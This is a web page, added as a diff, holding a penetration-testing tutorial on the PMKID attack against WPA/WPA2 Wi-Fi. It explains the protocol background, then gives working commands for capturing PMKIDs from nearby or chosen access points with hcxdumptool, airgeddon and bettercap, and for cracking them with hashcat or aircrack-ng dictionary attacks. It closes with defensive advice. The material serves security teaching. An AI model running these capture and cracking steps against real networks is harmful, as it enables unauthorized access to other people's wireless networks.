@@ -1,0 +1,239 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/wireless-penetration-testing/" rel="category tag">Wireless Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Wireless Penetration Testing: PMKID Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/" rel="bookmark"><time class="entry-date published" datetime="2021-06-24T18:16:43+00:00">June 24, 2021</time><time class="updated" datetime="2025-05-26T18:47:22+00:00">May 26, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="" data-start="125" data-end="684"><span style="color: #000000;"><strong>Team Hashcat</strong> developed the <strong>PMKID</strong> attack. In contrast, traditional handshake capture and brute-force methods wait for the client to de-authenticate and re-authenticate, whereas the PMKID attack skips this step. Instead, it captures the PMKID directly and then cracks it. This attack targets WPA and WPA2 protocols effectively. However, recent studies show that WPA3 offers far greater resistance and shows little to no success against PMKID attacks. Therefore, let’s first understand the basics of Wireless Networks so we can better comprehend how PMKID works.</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Open System Authentication</strong></span></li>
+<li><span style="color: #000000;"><strong>Shared Key Authentication</strong></span></li>
+<li><span style="color: #000000;"><strong>WPA and WPA2 PSK</strong></span></li>
+<li><span style="color: #000000;"><strong>4-way handshake</strong></span></li>
+<li><span style="color: #000000;"><strong>PMK Caching and PMKID (in the RSN IE frame)</strong></span></li>
+<li><span style="color: #000000;"><strong>Explanation of attack</strong></span></li>
+<li><span style="color: #000000;"><strong>Capturing PMKID using hcxdumptool</strong></span></li>
+<li><span style="color: #000000;"><strong>Converting pcapng to hashcat file and cracking using hashcat</strong></span></li>
+<li><span style="color: #000000;"><strong>Capturing only a single PMKID using hcxdumptool</strong></span></li>
+<li><span style="color: #000000;"><strong>Converting pcapng to pcap and cracking using Aircrack-ng</strong></span></li>
+<li><span style="color: #000000;"><strong>PMKID capture and attack using Airgeddon</strong></span></li>
+<li><span style="color: #000000;"><strong>PMKID capture using bettercap</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Open System Authentication</span></h3>
+<p><span style="color: #000000;">Open System Authentication (OSA) is an authentication process through which a computer can gain access to a wireless network making use of the Wired Equivalent Privacy (WEP) protocol. With OSA, a computer equipped with a wireless modem can access any WEP network and receive files that are unencrypted.</span></p>
+<h4><span style="color: #000000;">Process of authentication:</span></h4>
+<ul>
+<li><span style="color: #000000;">Client sees an SSID and sends a request to connect (request frame)</span></li>
+<li><span style="color: #000000;">Access Point sends a response back (response frame)</span></li>
+<li><span style="color: #000000;">Client sends an association or authentication request to AP</span></li>
+<li><span style="color: #000000;">AP generates an authentication code and sends it back to the client for use in that session only</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hyx6AEU-tyI/YNTGVv9c5TI/AAAAAAAAwyE/W5WXsDnh4FMsPeiBjw7pcYi_NeQGG9rkQCLcBGAsYHQ/s16000/Open%2BSystem%2BAuthentication.png"/></span></p>
+<p><span style="color: #000000;">Consider when you plug an ethernet cable in your desktop and it connects you right away to the network. It is analogous to WEP for wireless networks. Hence, the name wired equivalent protocol.</span></p>
+<p><span style="color: #000000;">There are obvious issues with this mechanism like decryption of authenticated code, static IV, weak encryption used etc. WEP protocol was enhanced by something known as a <strong>Shared Key Authentication.</strong></span></p>
+<h3><span style="color: #800000;">Shared Key Authentication</span></h3>
+<p><span style="color: #000000;">It is a method of authentication in WEP in which both the client and server have access to a key beforehand. This key is nothing but the Wi-Fi passphrase (password).</span></p>
+<p><span style="color: #000000;">So, in the process:</span></p>
+<ul>
+<li><span style="color: #000000;">Client sees an SSID and sends a request to connect (request frame)</span></li>
+<li><span style="color: #000000;">Access Point sends an encrypted file to client that can only be decrypted by the key (Wi-Fi Password)</span></li>
+<li><span style="color: #000000;">Client enters the password and sends the authentication request frame to AP</span></li>
+<li><span style="color: #000000;">AP verifies the decrypted file and confirms that client has the key used for authentication and grants access.</span></li>
+</ul>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-cNyoCr6nTiY/YNTGka2FbaI/AAAAAAAAwyI/OISKGPI0-RUe0nJylOr8Rs7CMcQJ_UeigCLcBGAsYHQ/s16000/Shared%2BKey%2BAuthentication.png"/></p>
+<p><span style="color: #000000;">UC Berkeley proved that WEP is a weak protocol due to encryption happening using that static key and hence the advent of WPA and WPA2</span></p>
+<h3><span style="color: #800000;">WPA and WPA2 (PSK)</span></h3>
+<p><span style="color: #000000;">Pre: We’ll only be talking about PSK authentication here in WPA2 in Unicast mode (AP to client 1 on 1 communication)</span></p>
+<p><span style="color: #000000;">Wi-Fi protected Access came in 2004 with the ability to work on the same hardware as WEP. Unlike WEP, WPA uses TKIP (Temporal Key Integrity Protocol) to <strong><em>dynamically generate a new key for each packet</em></strong>. Also, WPA2 includes mandatory support for CCMP protocol, based on AES. Let’s talk about the authentication in WPA/WPA2.</span></p>
+<p><span style="color: #000000;">Every user that logs on to a wireless network using WPA and WPA2 PSK methods already knows the <strong>Pre-Shared Key. </strong>PSK is 256 bits in size and is derived like this:</span></p>
+<h5><span style="color: #000000;"><strong>Pre-Shared Key = PBKDF2_SHA1 (Wi-Fi password (passphrase) + Wi-Fi SSID, Length of SSID + 4096 iterations of SHA1)</strong></span></h5>
+<p><span style="color: #000000;">PBKDF2_SHA1 is just an example hash function that can be customized too.</span></p>
+<p><span style="color: #000000;">So, if you tell your Wi-Fi password to your friend, he’ll have access to your PSK as well. Please note that PSK doesn’t encrypt the traffic and in fact, the traffic encryption keys are made or derived from this PSK.</span></p>
+<h5><span style="color: #000000;"><strong>In WPA2 PSK, the Pre-Shared Key is the same as the Pairwise Master Key (PMK).</strong></span></h5>
+<p class="" data-start="118" data-end="413"><span style="color: #000000;">This PSK does not directly encrypt data in each packet. Instead, the system derives encryption keys from the PSK and incorporates additional variables. The encryption key that encrypts all data in transit between a client and an Access Point (Unicast) is known as the Pairwise Transit Key (PTK).</span></p>
+<p><span style="color: #000000;">So, <strong>PTK = PSK or PMK + Anonce + Snonce + MAC (authenticator) and MAC (supplicant)</strong></span></p>
+<p><span style="color: #000000;">Here,</span></p>
+<ul>
+<li><span style="color: #000000;">Authenticator= AP</span></li>
+<li><span style="color: #000000;">Supplicant= client</span></li>
+<li><span style="color: #000000;">Anonce = 1-time value for each packet generated by the access point called an Authenticator nonce</span></li>
+<li><span style="color: #000000;">Snonce = 1-time value generated for each packet by the supplicant called a Supplicant nonce.</span></li>
+</ul>
+<p><span style="color: #000000;">Now that we know formulas for PSK and PTK, let’s see how client and access point creates, exchanges and verifies these keys using a 4-way handshake.</span></p>
+<p><span style="color: #000000;">Add: For broadcast and multicast modes, basic is the same, the keys generated are a little different. The pair then becomes GTK and GMK (Group Temporal Key, Group Master Key) and the PSK in this mode is generated from a Master Session Key (MSK).</span></p>
+<h3><span style="color: #800000;">4 Way handshake</span></h3>
+<p class="" data-start="813" data-end="985"><span style="color: #000000;">In layman terms, during authentication, the system transforms some source keying material into data encryption material. Eventually, this material encrypts the data frames. This process of turning source keying material into data encryption material is called a <strong>4-way handshake. </strong>As we saw above, both the client and authenticator (access point) know the PSK (aka PMK). But the PMK is not used to encrypt the data and a PTK has to be derived using PMK.</span></p>
+<h5><strong><span style="color: #000000;">Let’s understand how a handshake is done now:</span></strong></h5>
+<ol>
+<li><span style="color: #000000;"><strong>Client (aka Supplicant) PTK Creation: </strong></span>
+<ul>
+<li><span style="color: #000000;">Access Point sends a message with Anonce in it. Anonce is a one-time use value per packet.</span></li>
+<li><span style="color: #000000;">Client creates its own PTK now that it has all the inputs (both MACs, PMK, Snonce (created by self) and Anonce).</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>AP (aka Authenticator) PTK Creation: </strong></span>
+<ul>
+<li><span style="color: #000000;">Supplicant sends out a message to AP back with its Snonce so that the AP can generate the same PTK as well.</span></li>
+<li><span style="color: #000000;">This message is sent with the MIC field set to 1 as a check to verify if this message is corrupted or not or if the key has changed by a man in the middle or some other reason.</span></li>
+<li><span style="color: #000000;">Supplicant also sends out an RSN IE (or <strong>PMKID</strong>)</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Creation of group keys and transfer by AP to Supplicant: </strong></span>
+<ul>
+<li><span style="color: #000000;">Once the PTKs are verified, Access Point derives GTK from GMK (For broadcast and multicast communication).</span></li>
+<li><span style="color: #000000;">GTK is delivered to supplicant which is encrypted with PTK.</span></li>
+<li><span style="color: #000000;">The message is sent to the supplicant to install the temporal keys and an RSN IE packet is also sent in the frame.</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Confirmation of installation of keys: </strong>Supplicant confirms to the authenticator that keys have been installed.</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XMPQtISM118/YNTGvt1uieI/AAAAAAAAwyQ/AYnGRpOHzGsJ5XgZ3EYVSHNEmAiS8zvjACLcBGAsYHQ/s16000/4%2Bway%2Bhandshake.png"/></span></p>
+<h5><strong><span style="color: #000000;">In simpler words, a 4-way handshake does this:</span></strong></h5>
+<ul>
+<li><span style="color: #000000;">AP sends Anonce to client and he creates PTK</span></li>
+<li><span style="color: #000000;">Client sends Snonce to AP and he creates the same PTK</span></li>
+<li><span style="color: #000000;">AP derives Group Keys and sends to Client encrypted with PTK</span></li>
+<li><span style="color: #000000;">Supplicant installs the keys and sends confirmation back</span></li>
+</ul>
+<p><span style="color: #000000;">As you can see that this process is rather long and when a client goes out of range and comes back in range of the AP (called roaming) the process is lacking in efficiency. This is why routers host a smart roaming feature known as <strong>PMK caching.</strong></span></p>
+<h3><span style="color: #800000;">PMK Caching and PMKID</span></h3>
+<p><span style="color: #000000;">Okay, so by this time, the client and Access Point both have done a successful 4-way handshake and maintained something known as a <strong>PMKSA</strong> (PMK security association).</span></p>
+<p class="" data-start="197" data-end="543"><span style="color: #000000;"><strong>Access Point roaming</strong> refers to a scenario where a client or a supplicant moves outside the range of an AP and connects to another AP. Similarly to handoffs in cellular networks, this roaming can often affect connectivity because every time a client moves out of range of an AP and connects to another, the device performs a 4-way handshake again.</span></p>
+<p class="" data-start="545" data-end="837"><span style="color: #000000;">Consider corporate environments where there are multiple access points on multiple floors. Suppose you’re running with a laptop to the presentation room with an online presentation you made. You open your laptop and suddenly the connection drops—just a 1-second lag costs you your entire PPT.</span></p>
+<p><span style="color: #000000;">To make this handoff lag-free, we have a feature called <strong>PMK caching.</strong></span></p>
+<p class="" data-start="907" data-end="1263"><span style="color: #000000;">In many cases, routers cache the <strong>PMKID</strong> of the exchange process in a collection of information called <strong>PMKSA</strong>. Consequently, when the client de-authenticates and re-authenticates, the router no longer performs the 4-way handshake. Instead, it directly asks the client for the PMKSA, verifies it, and then quickly re-associates the client with an access point.</span></p>
+<h5><span style="color: #000000;"><strong>PMKSA = PMKID + Lifetime of PMK + MAC addresses + other variables</strong></span></h5>
+<p><span style="color: #000000;">PMKID is a hashed value of another hashed value (PMK) with 2 MACs and a fixed string.</span></p>
+<h5><span style="color: #000000;"><strong>PMKID = HMAC-SHA1-128(PMK, “PMK Name” + MAC (AP) + MAC(Supplicant)) </strong></span></h5>
+<p class="" data-start="135" data-end="812"><span style="color: #000000;">HMAC-SHA1 is, once again, just an example of a pseudo-random function. It appears as a field in the RSN IE frame (Robust Security Network Information Element). RSN IE is an optional frame that routers include. “PMK Name” serves as a fixed string label associated with the SSID. Now, the router caches this PMKID, and the next time my client connects to the AP, both the AP and the client simply verify this PMKID. As a result, they skip the 4-way handshake process entirely. PMKID caching operates on various IEEE 802.11 networks that support roaming. Moreover, many vendors now provide additional RSN security features as the prominence of PMKID attacks continues to increase.</span></p>
+<h3><span style="color: #800000;">Explanation of PMKID attack </span></h3>
+<p><span style="color: #000000;">Are all the routers vulnerable to PMKID attacks? No. Only the routers that have roaming feature enabled or present are vulnerable.</span></p>
+<p><span style="color: #000000;">Now, all that reading will yield fruits. Observe how if we are able to retrieve the PMKID from an Access Point, we’d get a hold of a hashed value containing the password. PMKID attack directly targets a single RSN IE frame. Since the PMKID is derived from PMK, a fixed string and 2 MACs it is defined as an “ideal attack vector” by Hashcat. We know now how PMK is created. So, to brute force PMKID, we need the following parameters:</span></p>
+<ul>
+<li><span style="color: #000000;">WiFi password (passphrase) – guess</span></li>
+<li><span style="color: #000000;">WiFi SSID – known</span></li>
+<li><span style="color: #000000;">Length of SSID – known</span></li>
+<li><span style="color: #000000;">MAC of Authenticator and Supplicant – known</span></li>
+<li><span style="color: #000000;">PMK Name – known</span></li>
+</ul>
+<p><span style="color: #000000;">So, we need only:</span></p>
+<h5><span style="color: #000000;"><strong>Retrieve PMKID -&gt; Guess Wi-Fi passphrase using dictionary -&gt; create PMK hash -&gt; create PMKID hash and compare with retrieved PMKID hash </strong></span></h5>
+<p><span style="color: #000000;">According to the original Hashcat article <strong><u><a style="color: #000000;" href="https://hashcat.net/forum/thread-7717.html">here</a></u></strong>, the main advantages are as follows:</span></p>
+<ul>
+<li><span style="color: #000000;">No more regular users required – because the attacker directly communicates with the AP (aka “client-less” attack)</span></li>
+<li><span style="color: #000000;">No more waiting for a complete 4-way handshake between the regular user and the AP</span></li>
+<li><span style="color: #000000;">No more eventual retransmissions of EAPOL frames (which can lead to uncrackable results)</span></li>
+<li><span style="color: #000000;">No more eventual invalid passwords sent by the regular user</span></li>
+<li><span style="color: #000000;">No more lost EAPOL frames when the regular user or the AP is too far away from the attacker</span></li>
+<li><span style="color: #000000;">No more fixing of nonce and replaycounter values required (resulting in slightly higher speeds)</span></li>
+<li><span style="color: #000000;">No more special output format (pcap, hccapx, etc.) – final data will appear as a regular hex-encoded string</span></li>
+</ul>
+<h3><span style="color: #800000;">Capturing PMKID using hcxdumptool</span></h3>
+<p><span style="color: #000000;">Now that we have an understanding of what PMKID is, we’ll try and retrieve this PMKID and try to attack it. We are using hcxdumptool to ask the AP for the PMKID frame and save that in a pcapng format.</span></p>
+<p><span style="color: #000000;">To install this along with other tools in the suite:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install hcxtools</pre>
+<p><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-UB_S3nujmJ4/YNS9v-I0YpI/AAAAAAAAwvQ/YWvH8fdhuVgSr8f2_2CZtB9-6fK57m0cQCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">After that, we have to put our Wi-Fi adapter or the NIC in monitor mode using aircrack-ng</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aircrack-ng start wlan0</pre>
+<p><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-CD8iM8_8XBg/YNS96mkhhsI/AAAAAAAAwvU/eSoLdrVHwkkP7jjc7K_DdeEBsF_qe0EawCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Now, we’ll try and capture PMKIDs from all the routers around us using hcx. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hcxdumptool -o demo -i wlan0mon --enable_status 5</pre>
+<p><span style="color: #000000;">Here, the demo is the output filewlan0mon is the interface and enable_status 5 means display authentication and EAP and EAPOL frames only. PMKID could be captured by status 1 as well. </span></p>
+<p><span style="color: #000000;"><strong>EAP Frames: </strong>EAP stands for Extensible Authentication Protocol. This protocol is used for authentication in WPA2-PSK routers. You see, when we talked about a 4-way handshake, their encryption keys were being created. EAP however, is responsible for the authentication of the client to Access Point.</span></p>
+<h5><span style="color: #000000;"><strong>The EAP process works as follows:</strong></span></h5>
+<ul>
+<li><span style="color: #000000;">New connection to wireless network requested by client to AP</span></li>
+<li><span style="color: #000000;">The AP asks for identification data from the user and forwards the received data to an authentication server.</span></li>
+<li><span style="color: #000000;">Authentication server requests and receives proof of validity of ID information from AP</span></li>
+<li><span style="color: #000000;">Access Point gets verification done from the user and sends verification message back to the authentication server.</span></li>
+<li><span style="color: #000000;">Server grants access and the user is connected to the network and further proceeds for a 4-way handshake.</span></li>
+</ul>
+<p><span style="color: #000000;">There is a total of 40+ authentication mechanisms in EAP but the gist is as told above. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D2ALoEYu28g/YNS-AqRBn3I/AAAAAAAAwvc/G46w6Z79qU4Q6plP4UHAW7Ts59OaZ9QtgCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">As you can see, we have captured the PMKID successfully.</span></p>
+<p><span style="color: #000000;">[PMKIDROGUE]: The PMKID is requested by hcxdumptool and not by a CLIENT</span></p>
+<p><span style="color: #000000;">[M1M2ROGUE]: EAPOL M2 is requested from a CLIENT by hcxdumptool and not from an AP.</span></p>
+<p><span style="color: #000000;">[PMKID:&lt;ID&gt; KDV:2]: You captured a PMKID requested from a CLIENT.  </span></p>
+<h3><span style="color: #800000;">Converting pcapng to hashcat file and cracking using hashcat</span></h3>
+<p><span style="color: #000000;">Now, we’ll use the hcxpcaptool to convert this pcapng file to a Hashcat crackable hash format. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hcxpcaptool -z hash demo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PgIlzXuRAdU/YNS-PYa5ZAI/AAAAAAAAwvg/gMpvFaLXjgY3xAYr6jI6AX7hEFCnYxvhACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">See how PMKIDs are written to the hash. Let us rename this “hash” to “pmkidhash.” Next up is the juicy brute force. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -m 16800 --force hash /usr/share/wordlists/rockyou.txt --show</pre>
+<p><span style="color: #000000;">16800 is the code for WPA PMKID type hash. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-os-hUc6xou8/YNS-TLhTFGI/AAAAAAAAwvo/KYhfRhHAs6YuBBt_l1-pFiQhSIE7molGwCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">And just like that, we have the password figured out.   </span></p>
+<h3><span style="color: #800000;">Capturing only a single PMKID using hcxdumptool</span></h3>
+<p><span style="color: #000000;">Now, earlier we were capturing all of the PMKIDs near us, what if we want to capture PMKID from a single Access Point? For that, we have to take note of the MAC ID of the AP. Here, from the previous hcxdumptool step, I saved</span> <span style="color: #000000;">the MAC ID in a text file called “target”  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pQvJRTS_uwA/YNS-W3IlM_I/AAAAAAAAwvs/jpq_IEhr6DUX1FaVhCwzwcnqi3QzfbfJQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Now, I’ll capture the PMKID and save the output in a file called raj. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hcxdumptool -o raj -i wlan0mon --enable_status=1 --filterlist_ap=target --filtermode=2</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8HfpOF9rUYg/YNS-bLpG0YI/AAAAAAAAwvw/xuNUjfc8VgwcVdORF_H8T5tFGKI6AigTwCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Now the PMKID is saved in a file called “raj”. </span></p>
+<p><span style="color: #000000;">We’ll repeat the steps above and crack the hash using Hashcat </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hcxpcaptool -z pmkidhash raj
+hashcat -m 16800 --force pmkidhash /usr/share/wordlists/rockyou.txt --show</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UmVqGeFGD24/YNS_D1bR1DI/AAAAAAAAwwM/mCxRbHPdx8MkVZDhS_hBMNP_nNjCFvqVACLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;">Converting pcapng to pcap and cracking using Aircrack-ng</span></h3>
+<p><span style="color: #000000;">In the demonstration above, we had captured a file called “demo” using hcxdumptool which was a pcapng file. Now we’ll convert this to pcap file and crack right away with aircrack-ng </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">file demo
+tcpdump -r demo -w demo.pcap
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7N4zsSF3-J8/YNS-jm0G-yI/AAAAAAAAwv8/u6C_SC2RIRwMVI6loQoXtCKGx6a3RbQbQCLcBGAsYHQ/s16000/48.png"/></span></p>
+<p><span style="color: #000000;">To crack this, we use the command: </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aircrack-ng demo.pcap -w /usr/share/wordlists/rockyou.txt</pre>
+<p><span style="color: #000000;">And then we type in the target (here, 11) </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xAc74qk0jBA/YNS_SRumD7I/AAAAAAAAwwQ/M8J34bYbh-IPDkiwBLb-MbLqbUDJf5oPgCLcBGAsYHQ/s16000/49.png"/></span></p>
+<p><span style="color: #000000;">Worked like a charm  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uBdDFDReWwk/YNS_YYg51sI/AAAAAAAAwwY/RNrllWsHYMA3SDUbeQ4x3DQj1TzdpYV8wCLcBGAsYHQ/s16000/50.png"/></span></p>
+<h3><span style="color: #800000;">PMKID capture and attack using Airgeddon</span></h3>
+<p><span style="color: #000000;">The manual labour and memorization of commands are eased down by airgeddon. Here, using this simple CLI we can press some numeric keys and do the same. Let us capture PMKID by running airgeddon script: </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RhS5ls0911Y/YNS_fIRusgI/AAAAAAAAwwc/mDRY8J_3LvAM1CT7rhp72nG6z6PhZUOzQCLcBGAsYHQ/s16000/75.png"/></span></p>
+<p><span style="color: #000000;">Then again press 5 and wait for the script to capture SSIDs around.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NKAFVZNncBo/YNS_uJtkVXI/AAAAAAAAwwo/EMo2PSmjUAEDmP43eP6msNFtoDsvLouAACLcBGAsYHQ/s16000/76.png"/></span></p>
+<p><span style="color: #000000;">Here, you’ll see a list of targets now. Our target is “Amit 2.4 G” on number 6. Then simply enter the timeout you want the script to wait to capture the PMKID. Let’s say 25 seconds are enough. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nj-sImsnkVI/YNS_8upUzZI/AAAAAAAAwww/dO68057JwLsE_7GOODLB4vmDxurCqxWtQCLcBGAsYHQ/s16000/77.png"/></span></p>
+<p><span style="color: #000000;">Sure enough, we can see a PMKID being captured here!  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hqIz1iZAUBs/YNTAFOpSQUI/AAAAAAAAww0/hQI0OQ5YjqEgsJb_6eL85pdVD2-ZfJtnACLcBGAsYHQ/s16000/78.png"/></span></p>
+<p><span style="color: #000000;">Then simply store this PMKID as a cap file. First press Y then enter the path and done.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u4zhoYD1HII/YNTAJvB-TJI/AAAAAAAAww4/p4fuawAoVr8Mf70zexskhcBiTVGdot4sQCLcBGAsYHQ/s16000/79.png"/></span></p>
+<p><span style="color: #000000;">Now, with an integrated aircrack-ng we can crack the cap file within airgeddon script itself like this:</span></p>
+<p><span style="color: #000000;">Just choose dictionary attack and yes and then the dictionary file. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HGcMDrXiJUc/YNTAUriCKmI/AAAAAAAAwxA/Yx4wAwwivikdIt9h9h-LOTnECIuVj-rNQCLcBGAsYHQ/s16000/80.png"/></span></p>
+<p><span style="color: #000000;">Sure enough, we have the password we needed  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bzRCWpHWBco/YNTAeKJA6PI/AAAAAAAAwxM/wzIlklTWHWQN8LWPE3JMhYU6oYCeS9qHACLcBGAsYHQ/s16000/81.png"/></span></p>
+<h3><span style="color: #800000;">PMKID capture using bettercap</span></h3>
+<p><span style="color: #000000;">For this final method, we will use a good old bettercap. This tool requires an older version of the pcap library so, we’ll first download that using wget. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb
+dpkg -i libpcap0.8_1.9.1-4_amd64.deb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8msaSopOKOg/YNTAkg-ldkI/AAAAAAAAwxQ/GV5BJyxSSXgerDXOXER7tsBE2jzknZc_ACLcBGAsYHQ/s16000/104.png"/></span></p>
+<p><span style="color: #000000;">Now that it’s installed and our adapter is in monitor mode, we’ll run bettercap</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bettercap
+set wifi.interface wlan0mon
+wifi.recon on</pre>
+<p><span style="color: #000000;">We’ll see all the APs in range  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-of2L0q80m1Y/YNTAtp4TybI/AAAAAAAAwxY/_tWJ7rlundAkoT95NVFaNNlyI7cqFP3EwCLcBGAsYHQ/s16000/105.png"/></span></p>
+<p><span style="color: #000000;">We’ll display this a little bit more clearly using:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.show</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t4unUow9apI/YNTA5A2faMI/AAAAAAAAwxg/x6dmGIWqScEuU4cJiQEKyAMiaSGZgZrNQCLcBGAsYHQ/s16000/106.png"/></span></p>
+<p><span style="color: #000000;">We now need to associate with an access point using the BSSID. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.assoc 68:14:01:5a:0e:9c</pre>
+<p><span style="color: #000000;">As you can see, PMKID is captured now in /root/bettercap-wifi-handshakes.pcap file.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FwhQP2XxkhU/YNTBDUMw6zI/AAAAAAAAwxk/pIFJ2XKWDIMZrwcy7cKIMFL4CRjfsQBQQCLcBGAsYHQ/s16000/107.png"/></span></p>
+<p><span style="color: #000000;">Similarly, if you want to capture PMKID of all the Access Points, </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.assoc all</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wm9rGWsqeos/YNTBZr01AFI/AAAAAAAAwx0/ieZQ1ebMnrAMBbmhxp56jwtvQVEI3Hg7ACLcBGAsYHQ/s16000/108.png"/></span></p>
+<p><span style="color: #000000;">We now need to convert this pcap file in Hashcat format and crack it as we did before, so: </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
+hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xn5YZYhdyeg/YNTBd_mv2mI/AAAAAAAAwx4/XY9g2h1-oYQmGVAjI6TOLwGuMDUdjQHfwCLcBGAsYHQ/s16000/109.png"/></span></p>
+<p class="" data-start="90" data-end="113"><span style="color: #000000;">At last, we did it!</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p class="" data-start="415" data-end="811"><span style="color: #000000;">Clearly, PMKID attacks pose a significant threat to SOHOs and enterprises. Therefore, you must take necessary steps to safeguard against these low-effort attacks that nearly anyone can perform. This scenario also emphasizes the need for a complex password and highlights the importance of upgrading to WPA3. Thank you for reading part 3 in the “Wi-Fi penetration testing series.” Have a nice day.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
